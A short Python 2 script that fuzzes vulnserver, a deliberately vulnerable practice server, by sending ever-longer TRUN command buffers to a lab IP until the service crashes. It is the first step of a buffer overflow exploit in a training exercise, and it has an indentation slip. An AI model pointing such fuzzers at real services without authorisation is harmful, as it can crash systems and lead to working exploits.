#!/usr/bin/python
#Fuzzing program for vulnserver target
import sys, socket
from time import sleep

buffer = "A" * 100
crashed = False
while crashed != True:
	try:
		s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
		s.connect(('169.254.215.29', 9999)) #target windows Machine IP address and vulnserver port

		s.send(('TRUN /.:/' + buffer))
		s.close()
		sleep(1)
		buffer = buffer + "A" * 100

	except:
		print "Fuzzing crashed at %s bytes" % str(len(buffer))
        crashed = True
		sys.exit()
